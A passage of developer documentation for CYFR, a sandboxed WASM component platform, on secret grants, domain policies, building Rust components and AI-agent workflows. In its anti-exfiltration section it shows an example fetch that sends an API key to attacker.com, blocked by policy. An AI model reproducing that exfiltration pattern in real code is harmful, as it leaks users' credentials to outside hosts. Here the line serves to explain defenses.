cyfr policy set my-api:0.1.0 allowed_domains '["api.example.com"]'
```

### What Happens on Denial

If a component calls `read::get("SECRET_NAME")` without a grant, the host function returns `Err("access-denied: SECRET_NAME not granted to <component_ref>")` and emits a telemetry event for the audit trail:

```
Component stripe-catalyst:1.0 denied access to secret "DB_PASSWORD"
  -> Telemetry: [:cyfr, :opus, :secret, :denied]
  -> Logged with component ref, secret name, timestamp
```

The component receives an `Err` variant and should handle it explicitly (e.g., return an error response). The WIT interface and JSON formats are documented in [WIT Interfaces](#wit-interfaces).

### Anti-Exfiltration

Even after a catalyst reads a secret, it cannot send it to an unauthorized server. Host Policy (`allowed_domains`) restricts all outbound HTTP at the WASI boundary:

```
Catalyst reads API_KEY = "sk-live-abc123"
Catalyst calls fetch("https://attacker.com?key=sk-live-abc123")
  -> BLOCKED by Opus: attacker.com not in allowed_domains
```

Additionally, the SecretMasker scrubs all granted secret values from execution output before it reaches logs or audit records — not just plaintext, but also Base64 (standard and URL-safe) and hex-encoded (lowercase and uppercase) variants. This prevents encoded exfiltration through return values.

**Summary of layered defenses protecting secrets at runtime:**

| Layer | What It Does |
|-------|-------------|
| Domain Restriction | `allowed_domains` blocks HTTP to any server not explicitly allowed |
| Private IP Blocking | Blocks SSRF to `127.0.0.1`, `169.254.169.254`, `10.x.x.x`, etc. |
| DNS Pinning | IP pinned on first resolve — prevents DNS rebinding attacks |
| Rate Limiting | Caps requests per time window — stops slow exfiltration |
| Full Request Visibility | All HTTP goes through `cyfr:http/fetch` host function — no CONNECT tunnels |
| SecretMasker | Scrubs plaintext + encoded secret variants from all output |
| Audit Trail | Every secret access and HTTP call logged with component ref and timestamp |

### Reagents Cannot Access Secrets

Reagents have no imports — they are pure computation with no access to `cyfr:secrets/read`, `cyfr:http/fetch`, or any other host function. This is enforced at the WASM level: Locus rejects any reagent binary that declares imports. If your component needs secrets, it must be a catalyst.

---

## Supported Languages

CYFR validates WASM output, not source code. Any language that compiles to a valid WASM Component Model binary can build components. Your toolchain, your choice.

> **Note**: CYFR does not provide or support specific toolchains. The component spec is the only contract that matters.

---

## How to Verify Locally

Always validate your component before importing to CYFR.

### Using the build.validate Action

```json
{
  "action": "validate",
  "artifact": { "path": "components/reagents/local/my-reagent/0.1.0/reagent.wasm" },
  "target": "reagent"
}
```

Response:
```json
{
  "valid": true,
  "target": "reagent",
  "exports": ["cyfr:reagent/compute"],
  "imports": [],
  "warnings": []
}
```

### Using wasm-tools (Local)

```bash
# Install wasm-tools
cargo install wasm-tools

# Validate WASM binary
wasm-tools validate component.wasm

# Inspect exports
wasm-tools component wit component.wasm

# Check for WASI imports (should be empty for reagents)
wasm-tools print component.wasm | grep "(import"
```

### Validation Checklist

Before importing, verify:

- [ ] Binary is valid WASM (`wasm-tools validate`)
- [ ] Correct interface exported (`wasm-tools component wit`)
- [ ] No forbidden imports (check for WASI imports on reagents)
- [ ] Binary size under 50 MB
- [ ] Test with sample input/output locally

---

## Example: Building a Reagent in Rust

Step-by-step guide to building a simple reagent component.

### 1. Create Project

```bash
mkdir -p components/reagents/local/my-reagent/0.1.0/src
cd components/reagents/local/my-reagent/0.1.0/src
cargo init --lib --name my-reagent
```

### 2. Configure Cargo.toml

```toml
[package]
name = "my-reagent"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
wit-bindgen = "0.25"
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"

[profile.release]
opt-level = "s"
lto = true
```

### 3. Add WIT Definition

Copy the canonical reagent WIT into your project:

```bash
cp -r wit/reagent/ components/reagents/local/my-reagent/0.1.0/src/wit/
```

This gives you `wit/world.wit`:

```wit
package cyfr:reagent@0.1.0;

interface compute {
    compute: func(input: string) -> string;
}

world reagent {
    export compute;
}
```

### 4. Implement the Component

```rust
// src/lib.rs
wit_bindgen::generate!({
    world: "reagent",
    exports: {
        "cyfr:reagent/compute": MyReagent,
    },
});

use exports::cyfr::reagent::compute::Guest;

struct MyReagent;

impl Guest for MyReagent {
    fn compute(input: String) -> String {
        // Parse JSON input
        let data: serde_json::Value = match serde_json::from_str(&input) {
            Ok(v) => v,
            Err(e) => return serde_json::json!({"error": e.to_string()}).to_string(),
        };

        // Your computation here
        let result = process_data(data);

        // Return JSON output
        serde_json::to_string(&result).unwrap_or_else(|e| {
            serde_json::json!({"error": e.to_string()}).to_string()
        })
    }
}

fn process_data(data: serde_json::Value) -> serde_json::Value {
    // Your logic here
    data
}
```

### 5. Build

```bash
cargo component build --release --target wasm32-wasip2

# Copy binary to canonical location
cp target/wasm32-wasip2/release/my_reagent.wasm ../reagent.wasm
```

### 6. Create Manifest

Create `components/reagents/local/my-reagent/0.1.0/cyfr-manifest.json`:

```json
{
  "id": "local.my-reagent",
  "type": "reagent",
  "version": "0.1.0",
  "description": "My custom data processing reagent",
  "schema": {
    "input": { "type": "object" },
    "output": { "type": "object" }
  }
}
```

This is the minimum manifest for a reagent. No `wasi` or `secrets` fields are needed since reagents have no imports.

### 7. Validate

```bash
wasm-tools validate components/reagents/local/my-reagent/0.1.0/reagent.wasm
```

### 8. Import to CYFR

```bash
cyfr import components/reagents/local/my-reagent/0.1.0/reagent.wasm --target reagent
```

---

## Example: Building a Catalyst in Rust

This walkthrough covers building a catalyst — a component with HTTP and secrets access.

### 1. Create Project

```bash
mkdir -p components/catalysts/local/my-api/0.1.0/src
cd components/catalysts/local/my-api/0.1.0/src
cargo init --lib --name my-api-catalyst
```

### 2. Configure Cargo.toml

```toml
[package]
name = "my-api-catalyst"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
wit-bindgen-rt = "0.25"
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"

[package.metadata.component.target.dependencies]
"cyfr:secrets" = { path = "wit/deps/cyfr-secrets" }
"cyfr:http" = { path = "wit/deps/cyfr-http" }

[profile.release]
opt-level = "s"
lto = true
codegen-units = 1
strip = true
```

### 3. Copy Catalyst WIT (Including Deps)

```bash
cp -r wit/catalyst/ components/catalysts/local/my-api/0.1.0/src/wit/
```

This gives you:

```
src/wit/
+-- world.wit                      # cyfr:catalyst@0.1.0
+-- deps/
    +-- cyfr-secrets/read.wit      # cyfr:secrets/read
    +-- cyfr-http/interfaces.wit   # cyfr:http/fetch + cyfr:http/streaming
```

### 4. Implement the Component

```rust
// src/lib.rs
#[allow(warnings)]
mod bindings;

use bindings::exports::cyfr::catalyst::run::Guest;

struct MyCatalyst;

bindings::export!(MyCatalyst with_types_in bindings);

impl Guest for MyCatalyst {
    fn run(input: String) -> String {
        let request: serde_json::Value = match serde_json::from_str(&input) {
            Ok(v) => v,
            Err(e) => return serde_json::json!({
                "error": {"message": format!("Invalid JSON: {}", e), "type": "invalid_request"}
            }).to_string(),
        };

        let operation = request["operation"].as_str().unwrap_or("");
        let params = &request["params"];

        match operation {
            "data.get" => fetch_data(params),
            _ => serde_json::json!({
                "error": {"message": format!("Unknown operation: {}", operation), "type": "invalid_request"}
            }).to_string(),
        }
    }
}

fn fetch_data(params: &serde_json::Value) -> String {
    // Read API key from secrets
    let api_key = match bindings::cyfr::secrets::read::get("MY_API_KEY") {
        Ok(key) => key,
        Err(e) => return serde_json::json!({"error": {"message": e, "type": "secret_denied"}}).to_string(),
    };

    // Make HTTP request via host function
    let req = serde_json::json!({
        "method": "GET",
        "url": "https://api.example.com/data",
        "headers": {
            "Authorization": format!("Bearer {}", api_key),
            "Content-Type": "application/json"
        }
    });

    let response_json = bindings::cyfr::http::fetch::request(&req.to_string());

    // Parse host response and format output
    let response: serde_json::Value = match serde_json::from_str(&response_json) {
        Ok(v) => v,
        Err(e) => return serde_json::json!({"error": {"message": e.to_string(), "type": "http_error"}}).to_string(),
    };

    if let Some(error) = response.get("error") {
        return serde_json::json!({"status": 502, "error": error}).to_string();
    }

    let status = response["status"].as_u64().unwrap_or(500);
    let body = response["body"].as_str().unwrap_or("");

    serde_json::json!({"status": status, "data": body}).to_string()
}
```

### 5. Build

```bash
cargo component build --release --target wasm32-wasip2

# Copy to canonical location
cp target/wasm32-wasip2/release/my_api_catalyst.wasm ../catalyst.wasm
```

### 6. Create Manifest

Create `components/catalysts/local/my-api/0.1.0/cyfr-manifest.json`:

```json
{
  "id": "local.my-api-catalyst",
  "type": "catalyst",
  "version": "0.1.0",
  "description": "Bridge to Example API",
  "wasi": {
    "http": true,
    "secrets": true
  },
  "secrets": ["MY_API_KEY"],
  "schema": {
    "input": {
      "type": "object",
      "required": ["operation"],
      "properties": {
        "operation": { "type": "string" },
        "params": { "type": "object" }
      }
    },
    "output": { "type": "object" }
  }
}
```

### 7. Set Up Secrets and Policy

Before the catalyst can run, you must configure secrets and policy:

```bash
# Store the API key
cyfr secret set MY_API_KEY=your-api-key-here

# Grant the catalyst access to the secret
cyfr secret grant my-api:0.1.0 MY_API_KEY

# Set allowed domains (REQUIRED for catalysts)
cyfr policy set my-api:0.1.0 allowed_domains '["api.example.com"]'
```

### 8. Validate and Test

```bash
# Validate the binary
wasm-tools validate components/catalysts/local/my-api/0.1.0/catalyst.wasm

# Import as draft and test
cyfr import components/catalysts/local/my-api/0.1.0/catalyst.wasm --target catalyst
```

---

## Example: Building a Formula in Rust

This example builds a Formula that invokes an API catalyst to list available models — a real composition use case.

### 1. Create Project

```bash
mkdir -p components/formulas/local/list-models/0.1.0/src
cd components/formulas/local/list-models/0.1.0/src
cargo init --lib --name list-models
```

### 2. Configure Cargo.toml

```toml
[package]
name = "list-models"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
wit-bindgen = "0.25"
serde_json = "1.0"

[profile.release]
opt-level = "s"
lto = true
```

### 3. Copy Formula WIT

```bash
cp -r wit/formula/ components/formulas/local/list-models/0.1.0/src/wit/
```

### 4. Implement the Formula

```rust
// src/lib.rs
wit_bindgen::generate!({
    world: "formula",
    exports: {
        "cyfr:formula/run": ListModels,
    },
});

use exports::cyfr::formula::run::Guest;
use cyfr::formula::invoke;

struct ListModels;

impl Guest for ListModels {
    fn run(input: String) -> String {
        // Parse input (optional — could accept filter params)
        let _input: serde_json::Value = serde_json::from_str(&input)
            .unwrap_or(serde_json::json!({}));

        // Invoke the API catalyst to list models
        let response = invoke::call(&serde_json::json!({
            "reference": {"registry": "my-api:0.1.0"},
            "input": {
                "operation": "models.list",
                "params": {}
            },
            "type": "catalyst"
        }).to_string());

        // Parse the invoke response
        let result: serde_json::Value = match serde_json::from_str(&response) {
            Ok(v) => v,
            Err(e) => return serde_json::json!({
                "error": format!("Failed to parse invoke response: {}", e)
            }).to_string(),
        };

        // Check for invoke-level errors
        if result.get("error").is_some() {
            return response; // Forward the error as-is
        }

        // Extract the output from the successful invoke
        // The invoke response is: {"status": "completed", "output": {...}}
        // The output contains the catalyst's response: {"status": 200, "data": {...}}
        let output = &result["output"];

        // Parse the catalyst output (it's a JSON string from the catalyst)
        let catalyst_result: serde_json::Value = match serde_json::from_str(
            output.as_str().unwrap_or("{}")
        ) {
            Ok(v) => v,
            Err(_) => output.clone(),
        };

        // Return the model list
        serde_json::json!({
            "models": catalyst_result.get("data").cloned().unwrap_or(catalyst_result)
        }).to_string()
    }
}
```

### 5. Build

```bash
cargo component build --release --target wasm32-wasip2

# Copy to canonical location
cp target/wasm32-wasip2/release/list_models.wasm ../formula.wasm
```

### 6. Create Manifest

Create `components/formulas/local/list-models/0.1.0/cyfr-manifest.json`:

```json
{
  "id": "local.list-models",
  "type": "formula",
  "version": "0.1.0",
  "description": "Lists available models via an API catalyst",
  "schema": {
    "input": { "type": "object" },
    "output": {
      "type": "object",
      "properties": {
        "models": { "type": "object" }
      }
    }
  }
}
```

### 7. Prerequisites

The API catalyst must be registered and configured before this formula can invoke it:

```bash
# Register the local API catalyst for discovery
cyfr register components/catalysts/local/my-api/0.1.0/

# Ensure secrets and policy are set for the API catalyst
cyfr secret set MY_API_KEY=sk-your-key
cyfr secret grant my-api:0.1.0 MY_API_KEY
cyfr policy set my-api:0.1.0 allowed_domains '["api.example.com"]'
```

### 8. Validate, Import, and Test

```bash
# Validate
wasm-tools validate components/formulas/local/list-models/0.1.0/formula.wasm

# Import as draft
cyfr import components/formulas/local/list-models/0.1.0/formula.wasm --target formula
# Returns: draft_<id>

# Test with empty input
cyfr run draft:<id> --input '{}'
```

---

## Testing and Running Components

### End-to-End Testing Flow

```
1. Build       cargo component build --release --target wasm32-wasip2
2. Validate    wasm-tools validate <type>.wasm
3. Policy      cyfr policy set <ref> allowed_domains '["api.example.com"]'    ← catalysts only
4. Secrets     cyfr secret set KEY=val && cyfr secret grant <ref> KEY         ← catalysts only
5. Execute     cyfr run <reference> --type <type> --input '{...}'
6. Verify      Check the JSON response
7. Logs        cyfr run --logs <execution_id>
8. Iterate     Rebuild + re-run (policy/secrets persist)
```

Steps 3-4 only apply to catalysts. Reagents need zero setup. Formulas need setup only for their sub-components.

### Running Components via CLI

```bash
# Run a local file directly
cyfr run ./components/reagents/local/my-reagent/0.1.0/reagent.wasm \
  --input '{"data": [1,2,3]}'

# Run by name (auto-resolves path)
cyfr run local:my-reagent:0.1.0 --input '{"data": [1,2,3]}'

# Run a catalyst (must specify type)
cyfr run local:my-api:0.1.0 --type catalyst \
  --input '{"operation": "models.list", "params": {}}'

# Run a published component
cyfr run my-api:0.1.0 --type catalyst \
  --input '{"operation": "models.list"}'

# List recent executions
cyfr run --list

# View execution details
cyfr run --logs exec_<id>

# Cancel a running execution
cyfr run --cancel exec_<id>
```

### Execution Response Format

```json
{
  "status": "completed",
  "execution_id": "exec_01234567-...",
  "result": {"models": [...]},
  "duration_ms": 1523,
  "component_type": "catalyst",
  "component_digest": "sha256:abc...",
  "reference": {"local": "..."},
  "policy_applied": {
    "allowed_domains": ["api.example.com"],
    "rate_limit": {"requests": 100, "window": "1m"}
  }
}
```

- `status` — `completed` means the WASM executed. The component may still return an error in its `result`.
- `result` — Whatever JSON the component returned.
- `policy_applied` — The policy active during execution (useful for debugging).

### Running Components via MCP (for AI Agents)

AI agents call the same tools programmatically via JSON-RPC:

**Execute:**
```json
{
  "jsonrpc": "2.0", "id": 1, "method": "tools/call",
  "params": {
    "name": "execution",
    "arguments": {
      "action": "run",
      "reference": {"local": "components/catalysts/local/my-api/0.1.0/catalyst.wasm"},
      "input": {"operation": "models.list", "params": {}},
      "type": "catalyst"
    }
  }
}
```

**List:** `{"action": "list", "status": "all", "limit": 20}`

**Logs:** `{"action": "logs", "execution_id": "exec_..."}`

**Cancel:** `{"action": "cancel", "execution_id": "exec_..."}`

Always specify `"type"` explicitly — don't rely on the `"reagent"` default.

### Setting Up Catalysts Before Testing

Catalysts require policy and secrets before they can execute:

```bash
# 1. Set allowed domains (REQUIRED — fails without this)
cyfr policy set my-api:0.1.0 allowed_domains '["api.example.com"]'

# 2. Store and grant secrets (if the catalyst reads secrets)
cyfr secret set MY_API_KEY=sk-live-abc123
cyfr secret grant my-api:0.1.0 MY_API_KEY

# 3. Now execute
cyfr run local:my-api:0.1.0 --type catalyst \
  --input '{"operation": "models.list"}'
```

Without policy: `"Catalyst 'my-api:0.1.0' has no allowed_domains configured."`

### Common Response Patterns

| Scenario | What You See |
|---|---|
| Success | `{"status": "completed", "result": {...}}` |
| Component returned error | `{"status": "completed", "result": {"error": {...}}}` |
| Missing policy | `"Catalyst 'X' has no allowed_domains configured."` |
| Rate limited | `"Rate limit exceeded. Retry in 60s"` |
| Timeout | `"Execution timeout after 10000ms"` |
| Secret denied | `"access-denied: API_KEY not granted to X"` |

### Viewing Logs and Audit

```bash
cyfr run --logs exec_<id>            # Full execution details
cyfr audit executions --limit 10     # Recent executions summary
cyfr audit list                      # Full audit log
cyfr audit export --format json      # Export audit data
```

---

## Draft Workflow

The draft workflow is the development iteration cycle for components. Drafts are ephemeral, in-memory WASM binaries for testing before publishing.

> **Tip**: For local development, registration provides a simpler path than drafts: build your component, place it in `components/{type}s/local/{name}/{version}/`, run `cyfr register` on the directory, and it's immediately searchable and executable via `{"registry": "name:version"}`. Use drafts when you want rapid iteration without rebuilding.

### Lifecycle

```
1. Build:    cargo component build --release --target wasm32-wasip2
2. Import:   build.import action -> returns draft_id (e.g., draft_a1b2c3d4e5f6g7h8)
3. Test:     execution.run with {"draft": "draft_a1b2c3d4e5f6g7h8"} -> test output
4. Iterate:  rebuild -> re-import -> re-test
5. Publish:  component.publish with draft_id + metadata -> permanent in components/
6. Run:      execution.run with {"registry": "name:version"}
```

### Draft Properties

- **Ephemeral**: Stored in-memory only — lost on server restart
- **TTL**: 24-hour expiry (configurable)
- **User-isolated**: Only accessible by the creating user (keyed by `{:draft, user_id, draft_id}`)
- **Not signed**: No Sigstore verification required (unlike published components)
- **ID format**: `draft_` prefix + 16 lowercase hex characters (e.g., `draft_a1b2c3d4e5f6g7h8`)

### MCP Actions

**Import a draft:**

```json
{
  "action": "import",
  "artifact": {"path": "components/reagents/local/my-tool/0.1.0/reagent.wasm"},
  "target": "reagent"
}
```

Response: `{"draft_id": "draft_a1b2c3d4e5f6g7h8", "name": "my-tool", "size": 245760}`

**Execute a draft:**

```json
{
  "action": "run",
  "reference": {"draft": "draft_a1b2c3d4e5f6g7h8"},
  "input": {"key": "value"},
  "type": "reagent"
}
```

**List drafts:**

```json
{"action": "list_drafts"}
```

**Delete a draft:**

```json
{"action": "delete_draft", "draft_id": "draft_a1b2c3d4e5f6g7h8"}
```

### Published Components

After testing via drafts, publish to make the component permanent and available via registry reference:

```json
{
  "action": "publish",
  "draft_id": "draft_a1b2c3d4e5f6g7h8",
  "manifest": {"id": "local.my-tool", "type": "reagent", "version": "0.1.0", "description": "..."}
}
```

Published components are **permanent and immutable** — stored in `components/` and accessible via `{"registry": "my-tool:0.1.0"}`.

---

## Common Errors and Fixes

Quick reference for frequent issues.

### Build-Time Errors

#### FORBIDDEN_IMPORT

**Error**: Reagent imports WASI interface

**Cause**: Your reagent has imports, but reagents must be pure.

**Fix**:
```bash
# Check for imports
wasm-tools print component.wasm | grep "(import"

# Common causes:
# - Using std::time, std::net, std::fs
# - Using random number generation (use deterministic seed instead)
# - Dependencies pulling in WASI
```

Solutions:
- Use `#[cfg(target_arch = "wasm32")]` to exclude non-WASM code
- Replace std library calls with pure alternatives
- Audit dependencies for WASI usage

#### MISSING_EXPORT

**Error**: Required interface not exported

**Cause**: Component doesn't export the correct interface.

**Fix**:
- Verify WIT definition includes correct export
- Check wit-bindgen generate! macro configuration
- Ensure implementation struct is properly exported

#### INVALID_WASM

**Error**: Binary is not valid WebAssembly

**Cause**: Build produced invalid output.

**Fix**:
- Check build logs for errors
- Verify target is `wasm32-wasip2` or `wasm32-unknown-unknown`
- Update toolchain to latest stable version
- Try `wasm-tools validate` locally for detailed errors

#### SIZE_EXCEEDED

**Error**: Binary exceeds 50 MB limit

**Fix**:
- Enable LTO: `lto = true` in Cargo.toml
- Use opt-level "s" or "z" for size optimization
- Remove unused dependencies
- Consider splitting into multiple components

### Runtime Errors

#### POLICY_REQUIRED

**Error**: `Catalyst 'my-catalyst' has no allowed_domains configured.`

**Cause**: Catalyst has no Host Policy set.

**Fix**:
```bash
cyfr policy set my-catalyst:1.0 allowed_domains '["api.example.com"]'
```

#### DOMAIN_BLOCKED

**Error**: `{"error": {"type": "domain_blocked", "message": "evil.com not in allowed_domains"}}`

**Cause**: HTTP request to a domain not in the catalyst's `allowed_domains` policy.

**Fix**: Add the domain to the catalyst's allowed domains:
```bash
cyfr policy set my-catalyst:1.0 allowed_domains '["api.example.com", "cdn.example.com"]'
```

#### RATE_LIMITED

**Error**: `{"error": {"type": "rate_limited", "message": "..."}}`

**Cause**: Too many requests in the rate limit window.

**Fix**: Wait for the rate limit window to reset. To increase limits, update the policy:
```bash
cyfr policy set my-catalyst:1.0 rate_limit '{"max_requests": 100, "window_seconds": 60}'
```

#### EXECUTION_TIMEOUT

**Error**: Component exceeded time limit.

**Cause**: Component took longer than the configured timeout (default: 10s).

**Fix**: Optimize the component logic, or increase the timeout via policy.

#### SECRET_DENIED

**Error**: `Err("access-denied: API_KEY not granted to my-catalyst:1.0")`

**Cause**: Secret not granted to this component.

**Fix**:
```bash
cyfr secret grant my-catalyst:1.0 API_KEY
```

---

## Best Practices

### Keep Reagents Pure

Reagents should be deterministic. Avoid:
- Current time/date
- Random numbers (use seeded RNG if needed)
- Environment variables
- Any I/O operations

### Minimize Binary Size

Smaller binaries load faster and have lower memory overhead.

```toml
# Cargo.toml
[profile.release]
opt-level = "s"      # Optimize for size
lto = true           # Link-time optimization
codegen-units = 1    # Better optimization
strip = true         # Strip symbols
```

### Handle Errors Gracefully

Return structured JSON errors, not panics:

```rust
// Good — return error as JSON
serde_json::json!({"error": "Expected 'name' field"}).to_string()

// Bad
panic!("Invalid input!")
```

### Test Before Import

Always validate locally:

```bash
# Validate structure
wasm-tools validate component.wasm

# Check exports
wasm-tools component wit component.wasm

# Run local tests
cargo test
```

---

## Component README

A `README.md` alongside the WASM binary is recommended for every component. While the manifest (`cyfr-manifest.json`) is machine-readable, the README provides human-readable context that schemas alone cannot convey.

Think of these as complementary layers:

- **Manifest** (`cyfr-manifest.json`): machine-readable contract — schemas, examples, capabilities, secrets. This is what tooling and agents read.
- **README** (`README.md`): human-readable companion — why to use it, how to get API keys, known gotchas, migration notes. This is what humans read when schemas aren't enough.

### What to Include

| Section | Description |
|---------|-------------|
| **Overview** | What the component does in plain language |
| **Supported Operations** | List of operations/functions the component handles |
| **Example Input/Output** | Copy-pasteable JSON payloads showing real usage |
| **Required Secrets** | Which secrets to grant and how to obtain them |
| **Configuration** | Available `config.json` keys and user-configurable overrides |
| **Known Limitations** | Rate limits, unsupported features, platform constraints |

### Template

```markdown
# {Component Name}

{One-sentence description of what this component does.}

## Operations

- `operation.name` — What it does
- `other.operation` — What it does

## Example

**Input:**
\```json
{ "operation": "example.create", "params": { ... } }
\```

**Output:**
\```json
{ "status": 200, "data": { ... } }
\```

## Secrets

| Secret | Description | How to Obtain |
|--------|-------------|---------------|
| `API_KEY` | API authentication key | Sign up at ... |

## Configuration

| Key | Type | Default | Description |
|-----|------|---------|-------------|
| `base_url` | string | `https://...` | API base URL |

## Limitations

- ...
```

---

## Publishing Checklist

Before publishing a component to the registry, verify:

- [ ] WASM binary passes `build.validate` (valid WASM, correct exports, no forbidden imports)
- [ ] `cyfr-manifest.json` present with required fields (`id`, `type`, `version`, `description`)
- [ ] Capability declarations in manifest match actual WASM imports (e.g., if your WIT imports `cyfr:http/fetch`, manifest has `wasi.http: true`)
- [ ] Input/output schemas defined in manifest (`schema.input`, `schema.output`)
- [ ] Required secrets listed in manifest (`secrets` array)
- [ ] `config.json` present if component documents configuration
- [ ] Config schema in manifest (`schema.config`) matches `config.json` structure
- [ ] Examples in manifest for common operations (recommended)
- [ ] `README.md` with usage examples (recommended)
- [ ] Tested via draft workflow with representative input
- [ ] **Catalysts only**: Host Policy set with `allowed_domains` and secrets granted

---

## Component Lifecycle

A component moves through distinct stages from source code to production execution. Each stage is handled by a specific service:

```
Build -> Validate -> Register -> Test (draft) -> Publish -> Pull -> Configure -> Execute
         Locus      Compendium   Opus          Compendium  Compendium  Config     Opus
```

| Stage | What Happens | Service | Command |
|-------|-------------|---------|---------|
| **Build** | Compile source to WASM binary | External (cargo, tinygo, etc.) | `cargo component build --release` |
| **Validate** | Check binary against component spec (exports, imports, size) | Locus | `build.validate` action |
| **Register** | Auto-index local/agent components for discovery | Compendium | Auto (boot) or `component.register` |
| **Test** | Import as ephemeral draft, run with sample input | Opus | `cyfr run draft:<id>` |
| **Publish** | Persist to storage, sign with Sigstore, push to registry | Compendium | `component.publish` |
| **Pull** | Download from registry to local `components/` directory | Compendium | `cyfr pull <reference>` |
| **Configure** | Set `config.json` defaults, component config overrides (via `cyfr config set`), grant secrets | Local + Sanctum | `cyfr config set`, `cyfr secret grant` |
| **Execute** | Run component in sandboxed WASM runtime with policy enforcement | Opus | `cyfr run <reference>` |

**The manifest (`cyfr-manifest.json`) is present from Build onward.** It is created alongside the source code during development, validated during import, and packaged into the OCI artifact during publish.

> **See also**: [Locus docs](docs/services/locus.md) for validation details, [Compendium docs](docs/services/compendium.md) for publishing and registry, [Opus docs](docs/services/opus.md) for runtime execution.

---

## Registering Components

Components must be known to Compendium (the SQLite registry) for discovery via `component.search` and resolution via `{"registry": "name:version"}`. There are two ways components enter the registry:

### `register` vs `publish`

| Operation | Who | Trust | Overwrite? | Enters via |
|-----------|-----|-------|------------|------------|
| `register` | Auto-indexer or developer | `:local` (unsigned) | Always | Filesystem scan or `component.register` |
| `publish` | Verified identity | `:signed` / `:sigstore` | Never (non-local) | Explicit action + signature |

Both write to the same SQLite `components` table. A `source` field distinguishes them:
- `"filesystem"` — auto-registered from `local/` or `agent/` directories
- `"published"` — explicitly published via `component.publish`

### How Registration Works

When you register a component (via `component.register` or batch scan), the system:

1. Reads the `cyfr-manifest.json` for metadata (type, version, description, tags)
2. Infers name and version from the directory path if not in manifest
3. Validates the WASM binary via Locus
4. Compares the digest with any existing SQLite entry — skips if unchanged
5. Registers the component with `source: "filesystem"`

### Security: Namespace Guard

Registration enforces namespace restrictions:
- **Only** `local/` and `agent/` publisher namespaces can be registered
- **Refuses** to register components found under other publisher names (e.g., `stripe/`, `cyfr/`)
- Only `publish` with proper identity verification can create named-publisher entries

### Manual Registration

To manually register (or re-register) a component without restarting:

```bash
# Via CLI
cyfr register components/catalysts/local/my-tool/0.1.0/

# Via MCP
{"tool": "component", "action": "register", "args": {"directory": "components/catalysts/local/my-tool/0.1.0/"}}
```

### Search Results

The `source` field appears in search results, so you can distinguish trust levels:
```
my-api:0.1.0 (catalyst) [filesystem] — Example API bridge
stripe:1.0.0 (catalyst) [published]  — Stripe payment processing
```

---

## Real-World Example: Composition in Action

This example shows how a Formula orchestrates multiple components to build a crypto trading bot:

```
+---------------------------------------------------------------+
|  Formula: crypto_bot:1.0 (orchestrates workflow via host calls)  |
+---------------------------------------------------------------+
|  1. invoke("twitter_api:1.0", ...) -> raw tweets                 |
|  2. invoke("sentiment_analyzer:3.5", ...) -> sentiment score     |
|  3. invoke("strategy_rsi:1.0", ...) -> buy/sell signal           |
|  4. If bullish: invoke("binance_api:2.0", ...) -> execute trade  |
+---------------------------------------------------------------+
```

### How It Works

A Formula is a WASM binary with **internal orchestration logic** — loops, conditionals, branching all live inside the WASM. When it needs to invoke a sub-component, it calls the `cyfr:formula/invoke.call` host function. Opus intercepts this call, executes the referenced component in its own sandbox, and returns the result to the Formula.

```rust
// Pseudocode — inside the Formula's WASM binary
use cyfr::formula::invoke;

fn run(input: String) -> String {
    // Step 1: Fetch tweets (Catalyst — has HTTP access)
    let tweets = invoke::call(&json!({
        "reference": {"registry": "twitter_api:1.0"},
        "input": {"query": "$BTC", "count": 100},
        "type": "catalyst"
    }).to_string());

    // Step 2: Analyze sentiment (Reagent — pure compute)
    let sentiment = invoke::call(&json!({
        "reference": {"registry": "sentiment_analyzer:3.5"},
        "input": {"texts": tweets},
        "type": "reagent"
    }).to_string());

    // Step 3: Compute trading signal (Reagent — pure compute)
    let signal: serde_json::Value = serde_json::from_str(&invoke::call(&json!({
        "reference": {"registry": "strategy_rsi:1.0"},
        "input": {"sentiment": sentiment, "prices": tweets},
        "type": "reagent"
    }).to_string())).unwrap();

    // Step 4: Conditional execution — only trade if bullish
    if signal["action"] == "buy" {
        invoke::call(&json!({
            "reference": {"registry": "binance_api:2.0"},
            "input": {"symbol": "BTCUSDT", "side": "BUY", "quantity": signal["position_size"]},
            "type": "catalyst"
        }).to_string())
    } else {
        json!({"action": "hold", "reason": signal["reason"]}).to_string()
    }
}
```

### Component Responsibilities

| Component | Type | I/O? |
|-----------|------|------|
| `crypto_bot:1.0` | Formula | No (invokes sub-components) |
| `twitter_api:1.0` | Catalyst | Yes (HTTP) |
| `sentiment_analyzer:3.5` | Reagent | No |
| `strategy_rsi:1.0` | Reagent | No |
| `binance_api:2.0` | Catalyst | Yes (HTTP) |

### Why This Pattern

1. **Pure Logic in Reagents**: Sentiment analysis and RSI strategy are deterministic—same inputs always produce same outputs. No network access means no exfiltration risk.

2. **I/O Isolated in Catalysts**: Only the API connectors (Twitter, Binance) have network access, and they're constrained by Host Policy (`allowed_domains`).

3. **Formula as Glue**: The orchestration logic runs inside WASM but can only interact with the outside world through `cyfr:formula/invoke`. Even if the Formula is malicious, it can only call other components — each of which runs in its own sandbox with its own policy enforcement.

4. **Runtime Enforces Everything**: Opus validates signatures, enforces policies, and executes each sub-component in isolation. The Formula never gets direct access to HTTP, secrets, or filesystem.

---

## Brain Formula Pattern

A **Brain Formula** uses LLM reasoning combined with `cyfr:mcp/tools` to dynamically discover, generate, and invoke components at runtime. This enables agent-driven workflows where the logic adapts based on what components exist.

### Flow

```
User Request: "Analyze the sentiment of these tweets"
    ↓
Brain calls LLM Catalyst for reasoning
    ↓
LLM returns: "I need a sentiment analyzer"
    ↓
Brain calls: mcp.call("component.search", {query: "sentiment"})
    ↓
If found → invoke it directly
If not found → Brain asks LLM to generate Go source
    ↓
Brain calls: mcp.call("build.compile", {source: "...", language: "go", target: "reagent"})
    ↓
Locus compiles via TinyGo → returns {local: "components/reagents/agent/gen-xyz/..."}
    ↓
Brain calls: invoke({local: "..."}, input)
    ↓
Result returned to user
```

### Example Policy

Brain Formulas require Host Policy with `mcp.allowed_tools`:

```yaml
mcp:
  allowed_tools:
    - "component.search"    # Discover from registry
    - "component.pull"      # Pull from registry
    - "build.compile"       # Compile Go → agent/ namespace
    - "secret.list"         # See available secrets (not read)
    - "storage.read"
    - "storage.write"
  storage:
    paths: ["brain/*"]
```

### Secrets Model

The Brain can **list** secrets but not read values:

```
// Allowed: see what secrets exist
mcp.call("secret.list", {})
